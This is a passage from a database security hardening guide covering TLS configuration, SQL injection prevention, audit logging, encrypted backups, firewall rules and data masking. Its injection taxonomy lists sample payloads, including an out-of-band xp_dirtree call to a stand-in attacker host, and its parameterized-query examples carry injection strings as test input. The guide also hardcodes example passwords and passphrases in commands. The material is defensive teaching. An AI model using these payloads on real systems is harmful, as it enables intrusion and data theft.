  -- Require specific certificate subject
  ALTER USER 'app_user'@'10.0.0.%'
    REQUIRE SUBJECT '/C=US/ST=State/L=City/O=Company/CN=db-client'
    AND ISSUER '/C=US/ST=State/L=City/O=Company/CN=Database-CA';

  -- Verify SSL status
  SHOW VARIABLES LIKE '%ssl%';
  SHOW STATUS LIKE 'Ssl_cipher';
  SELECT * FROM performance_schema.tls_channel_status;
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="PostgreSQL SSL"}
  ```ini [/etc/postgresql/16/main/postgresql.conf — SSL]
  # Enable SSL
  ssl = on
  ssl_cert_file = '/etc/db-ssl/server-cert.pem'
  ssl_key_file = '/etc/db-ssl/server-key.pem'
  ssl_ca_file = '/etc/db-ssl/ca-cert.pem'

  # Minimum TLS version
  ssl_min_protocol_version = 'TLSv1.2'

  # Strong ciphers only
  ssl_ciphers = 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256'

  # Prefer server cipher order
  ssl_prefer_server_ciphers = on

  # DH parameters
  ssl_dh_params_file = '/etc/db-ssl/dhparam.pem'
  ```

  ```conf [pg_hba.conf — Require SSL]
  # Force SSL for all remote connections
  hostssl  all  all  0.0.0.0/0  scram-sha-256
  hostssl  all  all  ::/0       scram-sha-256

  # Require client certificate (mutual TLS)
  hostssl  all  app_user  10.0.0.0/24  scram-sha-256  clientcert=verify-full
  ```

  ```sql [Verify PostgreSQL SSL]
  -- Check SSL status for current connection
  SELECT ssl, version, cipher, bits, client_dn
  FROM pg_stat_ssl
  JOIN pg_stat_activity ON pg_stat_ssl.pid = pg_stat_activity.pid;

  -- Check SSL settings
  SHOW ssl;
  SHOW ssl_cipher;
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="MongoDB TLS"}
  ```yaml [/etc/mongod.conf — TLS]
  net:
    tls:
      mode: requireTLS
      certificateKeyFile: /etc/db-ssl/mongodb-server.pem
      CAFile: /etc/db-ssl/ca-cert.pem
      disabledProtocols: TLS1_0,TLS1_1
      allowConnectionsWithoutCertificates: false
      # For mutual TLS (client certificate required)
      # clusterFile: /etc/db-ssl/mongodb-cluster.pem
  ```

  ```bash [Create Combined PEM for MongoDB]
  # MongoDB requires cert + key in a single PEM file
  cat /etc/db-ssl/server-cert.pem /etc/db-ssl/server-key.pem > /etc/db-ssl/mongodb-server.pem
  chmod 600 /etc/db-ssl/mongodb-server.pem
  chown mongodb:mongodb /etc/db-ssl/mongodb-server.pem

  sudo systemctl restart mongod

  # Connect with TLS
  mongosh --tls \
    --tlsCertificateKeyFile /etc/db-ssl/client.pem \
    --tlsCAFile /etc/db-ssl/ca-cert.pem \
    --host db-server.example.com
  ```
  :::
::

---

## 5 — SQL Injection Prevention

### Understanding SQL Injection Types

```text [SQL Injection Attack Types]

  ┌────────────────────────────────────────────────────────────┐
  │              SQL INJECTION TAXONOMY                         │
  │                                                            │
  │  IN-BAND SQLi                                              │
  │  ─────────────                                             │
  │  ├── Union-Based: Combines results from injected query     │
  │  │   ' UNION SELECT username, password FROM users--        │
  │  │                                                         │
  │  └── Error-Based: Extracts data from error messages        │
  │      ' AND 1=CONVERT(int,(SELECT TOP 1 username FROM...))  │
  │                                                            │
  │  INFERENTIAL (BLIND) SQLi                                  │
  │  ─────────────────────                                     │
  │  ├── Boolean-Based: True/false responses leak data         │
  │  │   ' AND SUBSTRING(username,1,1)='a'--                  │
  │  │                                                         │
  │  └── Time-Based: Response delay indicates true/false       │
  │      ' AND IF(1=1,SLEEP(5),0)--                           │
  │                                                            │
  │  OUT-OF-BAND SQLi                                          │
  │  ─────────────────                                         │
  │  └── Data exfiltrated via DNS/HTTP to attacker server      │
  │      ' ; EXEC xp_dirtree '\\attacker.com\share'--         │
  └────────────────────────────────────────────────────────────┘
```

### Prepared Statements (Parameterized Queries)

::note
**Prepared statements are the #1 defense** against SQL injection. They separate SQL code from data, making injection impossible regardless of user input.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python"}
  ```python [Python — Parameterized Queries]
  import mysql.connector
  import psycopg2
  from pymongo import MongoClient

  # ═══════════════════════════════════════════
  # MySQL — Parameterized Query (SAFE)
  # ═══════════════════════════════════════════

  conn = mysql.connector.connect(
      host='db-server', port=13306,
      user='app_user', password='Str0ng!P@ss#2024',
      database='myapp_db',
      ssl_ca='/etc/db-ssl/ca-cert.pem',
      ssl_verify_cert=True
  )
  cursor = conn.cursor(prepared=True)

  # ✅ SAFE: Parameterized query — user input is NEVER part of SQL string
  user_input = "admin' OR '1'='1"  # Attempted SQL injection
  cursor.execute(
      "SELECT id, username, email FROM users WHERE username = %s AND status = %s",
      (user_input, 'active')
  )
  # The injected string is treated as a literal string value, not SQL code

  # ❌ VULNERABLE: String concatenation — NEVER DO THIS
  # cursor.execute(f"SELECT * FROM users WHERE username = '{user_input}'")
  # This would execute: SELECT * FROM users WHERE username = 'admin' OR '1'='1'


  # ═══════════════════════════════════════════
  # PostgreSQL — Parameterized Query (SAFE)
  # ═══════════════════════════════════════════

  conn = psycopg2.connect(
      host='db-server', port=15432,
      user='app_user', password='Str0ng!P@ss#2024',
      dbname='myapp_db',
      sslmode='verify-full',
      sslrootcert='/etc/db-ssl/ca-cert.pem'
  )
  cursor = conn.cursor()

  # ✅ SAFE: Parameterized query
  search_term = "'; DROP TABLE users;--"  # Attempted injection
  cursor.execute(
      "SELECT id, username, email FROM users WHERE username = %s",
      (search_term,)
  )
  # The entire input is treated as a string parameter, not SQL


  # ═══════════════════════════════════════════
  # MongoDB — Safe Query (SAFE)
  # ═══════════════════════════════════════════

  client = MongoClient(
      'mongodb://app_user:password@db-server:27117/myapp_db',
      tls=True,
      tlsCAFile='/etc/db-ssl/ca-cert.pem'
  )
  db = client.myapp_db

  # ✅ SAFE: MongoDB driver handles parameterization
  user_input = {"$gt": ""}  # Attempted NoSQL injection
  # Always validate input type before querying
  if isinstance(user_input, str):
      result = db.users.find_one({"username": user_input})
  else:
      raise ValueError("Invalid input type")
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js"}
  ```javascript [Node.js — Parameterized Queries]
  // ═══════════════════════════════════════════
  // MySQL (mysql2) — SAFE
  // ═══════════════════════════════════════════

  const mysql = require('mysql2/promise');

  const pool = mysql.createPool({
      host: 'db-server',
      port: 13306,
      user: 'app_user',
      password: 'Str0ng!P@ss#2024',
      database: 'myapp_db',
      ssl: { ca: fs.readFileSync('/etc/db-ssl/ca-cert.pem') },
      waitForConnections: true,
      connectionLimit: 10
  });

  // ✅ SAFE: Parameterized query with ?
  const userInput = "admin' OR '1'='1";
  const [rows] = await pool.execute(
      'SELECT id, username, email FROM users WHERE username = ? AND status = ?',
      [userInput, 'active']
  );

  // ❌ VULNERABLE: Template literal injection
  // const [rows] = await pool.query(`SELECT * FROM users WHERE username = '${userInput}'`);


  // ═══════════════════════════════════════════
  // PostgreSQL (pg) — SAFE
  // ═══════════════════════════════════════════

  const { Pool } = require('pg');

  const pgPool = new Pool({
      host: 'db-server',
      port: 15432,
      user: 'app_user',
      password: 'Str0ng!P@ss#2024',
      database: 'myapp_db',
      ssl: { ca: fs.readFileSync('/etc/db-ssl/ca-cert.pem'), rejectUnauthorized: true }
  });

  // ✅ SAFE: Parameterized query with $1, $2, etc.
  const result = await pgPool.query(
      'SELECT id, username, email FROM users WHERE username = $1 AND status = $2',
      [userInput, 'active']
  );


  // ═══════════════════════════════════════════
  // MongoDB (mongoose) — SAFE
  // ═══════════════════════════════════════════

  const mongoose = require('mongoose');

  // ✅ SAFE: Mongoose sanitizes by default
  // But always validate input types!
  const User = mongoose.model('User', userSchema);

  // Validate that input is a string, not an object (prevents NoSQL injection)
  if (typeof userInput !== 'string') {
      throw new Error('Invalid input');
  }
  const user = await User.findOne({ username: userInput });

  // ❌ VULNERABLE to NoSQL injection if input is an object:
  // { "username": { "$gt": "" } } — would match all users
  // Always validate: typeof req.body.username === 'string'
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java"}
  ```java [Java — PreparedStatement]
  // ═══════════════════════════════════════════
  // JDBC PreparedStatement — SAFE
  // ═══════════════════════════════════════════

  import java.sql.*;

  // ✅ SAFE: PreparedStatement separates SQL from data
  String userInput = "admin' OR '1'='1";

  String sql = "SELECT id, username, email FROM users WHERE username = ? AND status = ?";

  try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
      pstmt.setString(1, userInput);    // Parameter index 1
      pstmt.setString(2, "active");     // Parameter index 2

      ResultSet rs = pstmt.executeQuery();
      while (rs.next()) {
          String username = rs.getString("username");
          String email = rs.getString("email");
      }
  }

  // ❌ VULNERABLE: String concatenation — NEVER
  // Statement stmt = connection.createStatement();
  // stmt.executeQuery("SELECT * FROM users WHERE username = '" + userInput + "'");
  ```
  :::
::

### Application User Privilege Minimization for SQLi Defense

```sql [Create Minimal Application User — MySQL]
-- Application user should NEVER have:
-- • FILE privilege (allows reading OS files)
-- • PROCESS privilege (shows other users' queries)
-- • SUPER privilege (bypasses restrictions)
-- • GRANT OPTION (can grant privileges to others)
-- • CREATE/DROP/ALTER (schema modification)

CREATE USER 'webapp'@'10.0.0.%'
  IDENTIFIED WITH caching_sha2_password BY 'W3b@pp!S3cur3#2024';

-- ONLY grant what the application needs
GRANT SELECT, INSERT, UPDATE, DELETE
  ON myapp_db.users TO 'webapp'@'10.0.0.%';
GRANT SELECT, INSERT, UPDATE, DELETE
  ON myapp_db.orders TO 'webapp'@'10.0.0.%';
GRANT SELECT
  ON myapp_db.products TO 'webapp'@'10.0.0.%';

-- No access to mysql system tables, information_schema write, etc.
-- Even if SQLi occurs, the attacker is limited to these specific tables

FLUSH PRIVILEGES;
```

---

## 6 — Audit Logging & Monitoring

### MySQL Audit Logging

```ini [/etc/mysql/mysql.conf.d/mysqld.cnf — Audit Logging]
[mysqld]
# ─── General Query Log (use sparingly — high I/O) ───
# general_log = ON
# general_log_file = /var/log/mysql/general.log

# ─── Slow Query Log ─────────────────────────────────
slow_query_log = ON
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2
log_queries_not_using_indexes = ON
min_examined_row_limit = 1000

# ─── Error Log ──────────────────────────────────────
log_error = /var/log/mysql/error.log
log_error_verbosity = 3

# ─── Binary Log (for replication + PITR) ─────────────
server-id = 1
log_bin = /var/log/mysql/mysql-bin
binlog_expire_logs_seconds = 604800  # 7 days
max_binlog_size = 100M
binlog_format = ROW

# ─── Connection Logging ─────────────────────────────
log_warnings = 2

# ─── MariaDB Audit Plugin (free alternative) ────────
# plugin-load-add = server_audit.so
# server_audit_logging = ON
# server_audit_events = CONNECT,QUERY_DDL,QUERY_DML,QUERY_DCL
# server_audit_file_path = /var/log/mysql/audit.log
# server_audit_file_rotate_size = 100000000
# server_audit_file_rotations = 10
```

```sql [MySQL Audit Plugin Setup]
-- Install MySQL Enterprise Audit (or community plugin)
INSTALL PLUGIN audit_log SONAME 'audit_log.so';

-- Configure audit filters
-- Log only DDL and failed logins
SELECT audit_log_filter_set_filter('security_filter',
  '{"filter": {"class": [
    {"name": "connection", "event": [{"name": "connect", "status": {"value": 1}}]},
    {"name": "general", "event": [{"name": "status", "log": false}]},
    {"name": "table_access", "log": true}
  ]}}');

-- Assign filter to all users
SELECT audit_log_filter_set_user('%', 'security_filter');

-- Verify audit is running
SELECT * FROM mysql.audit_log_filter;
SHOW VARIABLES LIKE 'audit_log%';
```

### PostgreSQL Audit Logging

```ini [/etc/postgresql/16/main/postgresql.conf — Audit]
# ─── Logging Configuration ──────────────────────────
logging_collector = on
log_directory = '/var/log/postgresql'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
log_file_mode = 0600
log_rotation_age = 1d
log_rotation_size = 100MB
log_truncate_on_rotation = off

# ─── What to Log ────────────────────────────────────
log_statement = 'ddl'              # none, ddl, mod, all
log_min_duration_statement = 1000  # Log queries taking > 1 second
log_connections = on
log_disconnections = on
log_duration = off                 # Set 'on' for performance analysis
log_hostname = off                 # DNS lookup is slow
log_line_prefix = '%t [%p-%l] %q%u@%d '  # timestamp, pid, user, db

# ─── Log Specific Events ────────────────────────────
log_lock_waits = on                # Log when waiting > deadlock_timeout
log_temp_files = 0                 # Log all temp file usage
log_checkpoints = on
log_autovacuum_min_duration = 250  # Log slow autovacuum

# ─── CSV Format for Parsing ─────────────────────────
log_destination = 'csvlog'
logging_collector = on

# ─── pgAudit Extension ──────────────────────────────
shared_preload_libraries = 'pgaudit'
pgaudit.log = 'ddl, role, write'   # What to audit
pgaudit.log_catalog = off          # Skip system catalog queries
pgaudit.log_parameter = on        # Log query parameters
pgaudit.log_statement_once = on   # Log each statement once
pgaudit.log_level = 'log'
```

```sql [pgAudit Setup]
-- Install pgAudit extension
CREATE EXTENSION IF NOT EXISTS pgaudit;

-- Configure per-role auditing
ALTER ROLE app_user SET pgaudit.log = 'read, write';
ALTER ROLE dba_user SET pgaudit.log = 'all';
ALTER ROLE report_user SET pgaudit.log = 'read';

-- Object-level auditing
ALTER ROLE auditor SET pgaudit.role = 'auditor';
GRANT SELECT ON sensitive_data TO auditor;
-- Now all SELECT on sensitive_data will be audit-logged

-- Verify
SHOW pgaudit.log;
SELECT name, setting FROM pg_settings WHERE name LIKE 'pgaudit%';
```

### MongoDB Audit Logging

```yaml [/etc/mongod.conf — Audit]
auditLog:
  destination: file
  format: JSON
  path: /var/log/mongodb/audit.json
  # Filter: Only audit authentication, authorization, and DDL
  filter: >
    {
      atype: {
        $in: [
          "authenticate",
          "authCheck",
          "createUser",
          "dropUser",
          "grantRolesToUser",
          "revokeRolesFromUser",
          "createRole",
          "dropRole",
          "createCollection",
          "dropCollection",
          "createDatabase",
          "dropDatabase",
          "createIndex",
          "dropIndex",
          "shutdown"
        ]
      }
    }

systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
  verbosity: 1
  component:
    accessControl:
      verbosity: 2
    command:
      verbosity: 1
```

### SIEM Integration

```text [Centralized Log Architecture]

  ┌─────────┐  ┌─────────┐  ┌─────────┐
  │ MySQL   │  │ Postgres│  │ MongoDB │
  │ Audit   │  │ pgAudit │  │ Audit   │
  │ Logs    │  │ Logs    │  │ Logs    │
  └────┬────┘  └────┬────┘  └────┬────┘
       │            │            │
       ▼            ▼            ▼
  ┌──────────────────────────────────────┐
  │     Filebeat / Fluentd / rsyslog     │
  │     (Log shippers)                   │
  └──────────────────┬───────────────────┘
                     │
                     ▼
  ┌──────────────────────────────────────┐
  │     Elasticsearch / Splunk / Loki    │
  │     (Log aggregation + indexing)     │
  └──────────────────┬───────────────────┘
                     │
                     ▼
  ┌──────────────────────────────────────┐
  │     Kibana / Grafana / Splunk UI     │
  │     (Dashboards + Alerting)          │
  │                                      │
  │  🚨 Alerts:                          │
  │  • Failed login > 5 in 1 minute     │
  │  • DROP/ALTER/TRUNCATE commands      │
  │  • New user creation                │
  │  • Privilege escalation             │
  │  • Connection from unknown IP       │
  │  • Query patterns matching SQLi     │
  └──────────────────────────────────────┘
```

```yaml [filebeat.yml — Ship Database Logs to ELK]
filebeat.inputs:
  # MySQL logs
  - type: log
    enabled: true
    paths:
      - /var/log/mysql/audit.log
      - /var/log/mysql/slow.log
      - /var/log/mysql/error.log
    fields:
      database: mysql
      environment: production
    multiline.pattern: '^#'
    multiline.negate: true
    multiline.match: after

  # PostgreSQL logs
  - type: log
    enabled: true
    paths:
      - /var/log/postgresql/*.csv
    fields:
      database: postgresql
      environment: production

  # MongoDB logs
  - type: log
    enabled: true
    paths:
      - /var/log/mongodb/audit.json
      - /var/log/mongodb/mongod.log
    fields:
      database: mongodb
      environment: production
    json.keys_under_root: true

output.elasticsearch:
  hosts: ["https://elk-server:9200"]
  username: "filebeat_writer"
  password: "${FILEBEAT_ES_PASSWORD}"
  ssl:
    certificate_authorities: ["/etc/filebeat/ca.pem"]
```

---

## 7 — Backup & Recovery Security

### Secure Backup Commands

::tabs
  :::tabs-item{icon="i-lucide-database" label="MySQL Backup"}
  ```bash [MySQL — Encrypted Backup]
  # ═══════════════════════════════════════════
  # Logical backup with mysqldump + encryption
  # ═══════════════════════════════════════════

  # Backup with compression and encryption
  mysqldump \
    --host=localhost \
    --port=13306 \
    --user=backup_user \
    --password='B@ckup!S3cur3#2024' \
    --single-transaction \
    --routines \
    --triggers \
    --events \
    --set-gtid-purged=OFF \
    --all-databases | \
    gzip | \
    openssl enc -aes-256-cbc -salt \
      -pass pass:"BackupEncryptionKey2024!" \
      -out /backup/mysql/mysql_full_$(date +%Y%m%d_%H%M%S).sql.gz.enc

  # ═══════════════════════════════════════════
  # Restore encrypted backup
  # ═══════════════════════════════════════════

  openssl enc -d -aes-256-cbc \
    -pass pass:"BackupEncryptionKey2024!" \
    -in /backup/mysql/mysql_full_20240101_120000.sql.gz.enc | \
    gunzip | \
    mysql -u root -p

  # ═══════════════════════════════════════════
  # Verify backup integrity
  # ═══════════════════════════════════════════

  # Generate checksum after backup
  sha256sum /backup/mysql/mysql_full_*.enc > /backup/mysql/checksums.sha256

  # Verify checksum before restore
  sha256sum -c /backup/mysql/checksums.sha256
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="PostgreSQL Backup"}
  ```bash [PostgreSQL — Encrypted Backup]
  # ═══════════════════════════════════════════
  # Logical backup with pg_dump + encryption
  # ═══════════════════════════════════════════

  # Full database backup with encryption
  PGPASSWORD='B@ckup!S3cur3#2024' pg_dump \
    --host=localhost \
    --port=15432 \
    --username=backup_user \
    --format=custom \
    --compress=9 \
    --verbose \
    --file=/tmp/pgbackup.dump \
    myapp_db

  # Encrypt the backup
  gpg --symmetric --cipher-algo AES256 \
    --batch --passphrase "BackupEncryptionKey2024!" \
    --output /backup/postgres/pg_$(date +%Y%m%d_%H%M%S).dump.gpg \
    /tmp/pgbackup.dump

  # Remove unencrypted temp file
  shred -u /tmp/pgbackup.dump

  # ═══════════════════════════════════════════
  # WAL archiving for Point-in-Time Recovery
  # ═══════════════════════════════════════════

  # In postgresql.conf:
  # archive_mode = on
  # archive_command = 'gpg --symmetric --cipher-algo AES256 --batch --passphrase-file /etc/postgresql/backup_key %p -o /backup/wal/%f.gpg'
  # wal_level = replica

  # ═══════════════════════════════════════════
  # Restore encrypted backup
  # ═══════════════════════════════════════════

  gpg --decrypt --batch --passphrase "BackupEncryptionKey2024!" \
    /backup/postgres/pg_20240101_120000.dump.gpg | \
    pg_restore --host=localhost --port=15432 \
    --username=postgres --dbname=myapp_db --verbose
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="MongoDB Backup"}
  ```bash [MongoDB — Encrypted Backup]
  # ═══════════════════════════════════════════
  # mongodump with encryption
  # ═══════════════════════════════════════════

  mongodump \
    --host=localhost \
    --port=27117 \
    --username=backup_user \
    --password='B@ckup!S3cur3#2024' \
    --authenticationDatabase=admin \
    --tls \
    --tlsCAFile=/etc/db-ssl/ca-cert.pem \
    --gzip \
    --out=/tmp/mongodump_$(date +%Y%m%d)

  # Encrypt the backup directory
  tar -czf - /tmp/mongodump_$(date +%Y%m%d) | \
    openssl enc -aes-256-cbc -salt \
      -pass pass:"BackupEncryptionKey2024!" \
      -out /backup/mongo/mongo_$(date +%Y%m%d_%H%M%S).tar.gz.enc

  # Cleanup unencrypted dump
  rm -rf /tmp/mongodump_*

  # ═══════════════════════════════════════════
  # Restore encrypted backup
  # ═══════════════════════════════════════════

  openssl enc -d -aes-256-cbc \
    -pass pass:"BackupEncryptionKey2024!" \
    -in /backup/mongo/mongo_20240101_120000.tar.gz.enc | \
    tar -xzf - -C /tmp/

  mongorestore \
    --host=localhost \
    --port=27117 \
    --username=backup_user \
    --password='B@ckup!S3cur3#2024' \
    --authenticationDatabase=admin \
    --gzip \
    /tmp/mongodump_20240101/
  ```
  :::
::

### Automated Backup Script with Security

```bash [scripts/secure_backup.sh]
#!/bin/bash
# ═══════════════════════════════════════════════════════
# Secure Database Backup Script
# Features: Encryption, integrity verification, rotation,
#           secure transfer, alerting
# ═══════════════════════════════════════════════════════

set -euo pipefail

# Configuration
BACKUP_DIR="/backup"
ENCRYPTION_KEY_FILE="/etc/db-backup/encryption.key"
RETENTION_DAYS=30
REMOTE_BACKUP_HOST="backup-server.example.com"
REMOTE_BACKUP_PATH="/remote-backup/databases"
ALERT_EMAIL="dba-team@example.com"
DATE=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/var/log/db-backup/backup_${DATE}.log"

mkdir -p "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# MySQL Backup
backup_mysql() {
    log "Starting MySQL backup..."
    local BACKUP_FILE="${BACKUP_DIR}/mysql/mysql_${DATE}.sql.gz.enc"
    mkdir -p "${BACKUP_DIR}/mysql"

    mysqldump --user=backup_user \
      --password="$(cat /etc/db-backup/mysql_backup_pass)" \
      --single-transaction --routines --triggers --events \
      --all-databases 2>>"$LOG_FILE" | \
      gzip | \
      openssl enc -aes-256-cbc -salt \
        -pass file:"$ENCRYPTION_KEY_FILE" \
        -out "$BACKUP_FILE"

    # Generate checksum
    sha256sum "$BACKUP_FILE" > "${BACKUP_FILE}.sha256"
    log "MySQL backup complete: $BACKUP_FILE ($(du -h "$BACKUP_FILE" | cut -f1))"
}

# PostgreSQL Backup
backup_postgres() {
    log "Starting PostgreSQL backup..."
    local BACKUP_FILE="${BACKUP_DIR}/postgres/pg_${DATE}.dump.enc"
    mkdir -p "${BACKUP_DIR}/postgres"

    PGPASSWORD="$(cat /etc/db-backup/pg_backup_pass)" pg_dumpall \
      --host=localhost --port=15432 --username=backup_user \
      2>>"$LOG_FILE" | \
      gzip | \
      openssl enc -aes-256-cbc -salt \
        -pass file:"$ENCRYPTION_KEY_FILE" \
        -out "$BACKUP_FILE"

    sha256sum "$BACKUP_FILE" > "${BACKUP_FILE}.sha256"
    log "PostgreSQL backup complete: $BACKUP_FILE ($(du -h "$BACKUP_FILE" | cut -f1))"
}

# MongoDB Backup
backup_mongodb() {
    log "Starting MongoDB backup..."
    local BACKUP_FILE="${BACKUP_DIR}/mongo/mongo_${DATE}.tar.gz.enc"
    mkdir -p "${BACKUP_DIR}/mongo" /tmp/mongodump_${DATE}

    mongodump \
      --host=localhost --port=27117 \
      --username=backup_user \
      --password="$(cat /etc/db-backup/mongo_backup_pass)" \
      --authenticationDatabase=admin \
      --gzip \
      --out="/tmp/mongodump_${DATE}" 2>>"$LOG_FILE"

    tar -cf - "/tmp/mongodump_${DATE}" | \
      openssl enc -aes-256-cbc -salt \
        -pass file:"$ENCRYPTION_KEY_FILE" \
        -out "$BACKUP_FILE"

    rm -rf "/tmp/mongodump_${DATE}"
    sha256sum "$BACKUP_FILE" > "${BACKUP_FILE}.sha256"
    log "MongoDB backup complete: $BACKUP_FILE ($(du -h "$BACKUP_FILE" | cut -f1))"
}

# Secure transfer to remote backup server
transfer_backups() {
    log "Transferring backups to remote server..."
    rsync -avz --progress \
      -e "ssh -i /etc/db-backup/backup_ssh_key -o StrictHostKeyChecking=yes" \
      "${BACKUP_DIR}/" \
      "${REMOTE_BACKUP_HOST}:${REMOTE_BACKUP_PATH}/" \
      2>>"$LOG_FILE"
    log "Transfer complete."
}

# Cleanup old backups
cleanup() {
    log "Cleaning backups older than ${RETENTION_DAYS} days..."
    find "${BACKUP_DIR}" -name "*.enc" -mtime +${RETENTION_DAYS} -delete
    find "${BACKUP_DIR}" -name "*.sha256" -mtime +${RETENTION_DAYS} -delete
    log "Cleanup complete."
}

# Main execution
log "═══════════ Database Backup Started ═══════════"
backup_mysql
backup_postgres
backup_mongodb
transfer_backups
cleanup
log "═══════════ Database Backup Complete ═══════════"
```

---

## 8 — Database Firewall Rules

### Network-Level Firewall (iptables/nftables/ufw)

```bash [Database Firewall Rules — UFW]
# ═══════════════════════════════════════════
# Default deny all incoming
# ═══════════════════════════════════════════
sudo ufw default deny incoming
sudo ufw default allow outgoing

# ═══════════════════════════════════════════
# MySQL — Allow only from application servers
# ═══════════════════════════════════════════
sudo ufw allow from 10.0.0.100 to any port 13306 proto tcp comment "App Server 1 → MySQL"
sudo ufw allow from 10.0.0.101 to any port 13306 proto tcp comment "App Server 2 → MySQL"
sudo ufw allow from 10.0.0.102 to any port 13306 proto tcp comment "App Server 3 → MySQL"
sudo ufw allow from 10.0.0.20 to any port 13306 proto tcp comment "Backup Server → MySQL"
sudo ufw allow from 10.0.0.50 to any port 13306 proto tcp comment "Monitor → MySQL"

# ═══════════════════════════════════════════
# PostgreSQL — Allow only from application servers
# ═══════════════════════════════════════════
sudo ufw allow from 10.0.0.100 to any port 15432 proto tcp comment "App Server 1 → PostgreSQL"
sudo ufw allow from 10.0.0.101 to any port 15432 proto tcp comment "App Server 2 → PostgreSQL"
sudo ufw allow from 10.0.0.20 to any port 15432 proto tcp comment "Backup Server → PostgreSQL"

# ═══════════════════════════════════════════
# MongoDB — Allow only from application servers
# ═══════════════════════════════════════════
sudo ufw allow from 10.0.0.100 to any port 27117 proto tcp comment "App Server 1 → MongoDB"
sudo ufw allow from 10.0.0.101 to any port 27117 proto tcp comment "App Server 2 → MongoDB"

# ═══════════════════════════════════════════
# SSH — Management access only
# ═══════════════════════════════════════════
sudo ufw allow from 10.0.0.5 to any port 22 proto tcp comment "Admin Workstation → SSH"

# Enable firewall
sudo ufw enable
sudo ufw status verbose
```

```bash [iptables — Advanced Rules]
# Rate limit connections to database port (anti-brute-force)
iptables -A INPUT -p tcp --dport 13306 -m state --state NEW \
  -m recent --set --name MYSQL_CONN
iptables -A INPUT -p tcp --dport 13306 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 20 --name MYSQL_CONN \
  -j DROP

# Log and drop all other database connection attempts
iptables -A INPUT -p tcp --dport 13306 -j LOG \
  --log-prefix "MYSQL_BLOCKED: " --log-level 4
iptables -A INPUT -p tcp --dport 13306 -j DROP

# Time-based access (allow only during business hours)
iptables -A INPUT -p tcp --dport 13306 -s 10.0.0.200 \
  -m time --timestart 08:00 --timestop 18:00 --weekdays Mon,Tue,Wed,Thu,Fri \
  -j ACCEPT
```

---

## 9 — Data Masking & Redaction

### Static Data Masking

```sql [MySQL — Static Data Masking Functions]
-- ═══════════════════════════════════════════
-- Create masked copy of production database
-- ═══════════════════════════════════════════

-- Email masking function
DELIMITER //
CREATE FUNCTION mask_email(email VARCHAR(255))
RETURNS VARCHAR(255)
DETERMINISTIC
BEGIN
    DECLARE at_pos INT;
    SET at_pos = LOCATE('@', email);
    IF at_pos > 0 THEN
        RETURN CONCAT(
            LEFT(email, 1),
            REPEAT('*', at_pos - 2),
            SUBSTRING(email, at_pos)
        );
    END IF;
    RETURN email;
END//

-- Phone masking function
CREATE FUNCTION mask_phone(phone VARCHAR(20))
RETURNS VARCHAR(20)
DETERMINISTIC
BEGIN
    RETURN CONCAT(
        REPEAT('*', LENGTH(phone) - 4),
        RIGHT(phone, 4)
    );
END//

-- Credit card masking function
CREATE FUNCTION mask_credit_card(cc VARCHAR(19))
RETURNS VARCHAR(19)
DETERMINISTIC
BEGIN
    RETURN CONCAT(
        REPEAT('*', LENGTH(cc) - 4),
        RIGHT(cc, 4)
    );
END//

-- SSN masking function
CREATE FUNCTION mask_ssn(ssn VARCHAR(11))
RETURNS VARCHAR(11)
DETERMINISTIC
BEGIN
    RETURN CONCAT('***-**-', RIGHT(REPLACE(ssn, '-', ''), 4));
END//
DELIMITER ;

-- ═══════════════════════════════════════════
-- Create masked view for non-production use
-- ═══════════════════════════════════════════

CREATE OR REPLACE VIEW masked_customers AS
SELECT
    id,
    CONCAT(LEFT(first_name, 1), REPEAT('*', LENGTH(first_name) - 1)) AS first_name,
    CONCAT(LEFT(last_name, 1), REPEAT('*', LENGTH(last_name) - 1)) AS last_name,
    mask_email(email) AS email,
    mask_phone(phone) AS phone,
    mask_credit_card(credit_card) AS credit_card,
    mask_ssn(ssn) AS ssn,
    -- Non-sensitive fields pass through
    city,
    state,
    country,
    created_at
FROM customers;

-- Grant report users access to masked view only
GRANT SELECT ON myapp_db.masked_customers TO 'report_user'@'10.0.0.%';
-- Revoke access to the raw table
REVOKE ALL ON myapp_db.customers FROM 'report_user'@'10.0.0.%';
```

### PostgreSQL Dynamic Data Masking

```sql [PostgreSQL — Dynamic Masking with Views + RLS]
-- ═══════════════════════════════════════════
-- Dynamic masking based on user role
-- ═══════════════════════════════════════════

-- Create masking functions
CREATE OR REPLACE FUNCTION mask_email(email TEXT)
RETURNS TEXT AS $$
BEGIN
    RETURN SUBSTRING(email FROM 1 FOR 1) ||
           REPEAT('*', POSITION('@' IN email) - 2) ||
           SUBSTRING(email FROM POSITION('@' IN email));
END;
$$ LANGUAGE plpgsql IMMUTABLE;

CREATE OR REPLACE FUNCTION mask_credit_card(cc TEXT)
RETURNS TEXT AS $$
BEGIN
    RETURN REPEAT('*', LENGTH(cc) - 4) || RIGHT(cc, 4);
END;
$$ LANGUAGE plpgsql IMMUTABLE;

-- Create view with conditional masking based on role
CREATE OR REPLACE VIEW customer_view AS
SELECT
    id,
    CASE
        WHEN pg_has_role(current_user, 'pii_access', 'MEMBER')
        THEN first_name
        ELSE LEFT(first_name, 1) || REPEAT('*', LENGTH(first_name) - 1)
    END AS first_name,
    CASE
        WHEN pg_has_role(current_user, 'pii_access', 'MEMBER')
        THEN email
        ELSE mask_email(email)
    END AS email,
    CASE
        WHEN pg_has_role(current_user, 'pii_access', 'MEMBER')
        THEN credit_card
        ELSE mask_credit_card(credit_card)
    END AS credit_card,
    city,
    state,
    created_at
FROM customers;

-- Create PII access role
CREATE ROLE pii_access NOLOGIN;

-- Authorized users get full data
GRANT pii_access TO authorized_analyst;

-- Unauthorized users see masked data
